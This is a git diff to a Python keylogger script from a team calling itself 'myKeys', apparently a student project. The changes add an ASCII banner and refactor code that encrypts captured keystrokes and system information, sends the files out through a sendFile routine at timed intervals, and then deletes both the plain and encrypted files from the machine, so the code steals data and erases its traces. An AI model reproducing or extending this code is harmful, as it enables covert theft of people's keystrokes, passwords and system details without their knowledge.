@@ -1,6 +1,16 @@
+print("                  _  __")
+print("                 | |/ /")
+print("  _ __ ___  _   _| ' / ___ _   _ ___")
+print(" | '_ ` _ \| | | |  < / _ \ | | / __|")
+print(" | | | | | | |_| | . \  __/ |_| \__ \\")
+print(" |_| |_| |_|\__, |_|\_\___|\__, |___/")
+print("             __/ |          __/ |")
+print("            |___/          |___/")
+
+
 # Team myKeys
 # keylogger.py
-# Connor Blaszkiewicz, Neta Shiff, Benjamin Jenkins, !!add rest of your names here!!
+# Connor Blaszkiewicz, Neta Shiff, Benjamin Jenkins
 
 # Libraries Used
 import base64
@@ -253,9 +263,8 @@ def encryptions(key, name, email, system, keylogger):
             sendFile(keylogger_encrypt_filename[count], False)
         count += 1
     ### Deletes Files After they are Encrypted and Sent ###
-    deleteFiles = [systemInfo, loggedKeys]
-    for file in deleteFiles:
-        os.remove(extendedPath + file)
+    remove_files()
+
 
 
 ### ENCRYPT FILES HERE ###
@@ -304,8 +313,8 @@ def encrypt_gnupg(email, key, file_to_encrypt, encrypted_file):
 
 
 def fernet_encrypt():
-    files_to_encrypt = [extendedPath + system_information, extendedPath + keys_information]
-    encrypted_file_names = [extendedPath + system_information_e, extendedPath + keys_information_e]
+    files_to_encrypt = [extendedPath + systemInfo, extendedPath + loggedKeys]
+    encrypted_file_names = [extendedPath + systemInfoEncrypted, extendedPath + loggedKeysEncrypted]
 
     count = 0
 
@@ -321,7 +330,15 @@ def fernet_encrypt():
             f.write(encrypted)
 
         count += 1
-    send_file(file_path + extend + system_information_e, True)
+    sendFile(extendedPath + extend + systemInfoEncrypted, True)
     time.sleep(20)
-    send_file(file_path + extend + keys_information_e, False)
+    sendFile(extendedPath + extend + loggedKeysEncrypted, False)
     time.sleep(30)
+
+
+def remove_files():
+    delete_files = [systemInfo, loggedKeys, systemInfoEncrypted, loggedKeysEncrypted]
+    for file in delete_files:
+        os.remove(extendedPath + file)
+
+
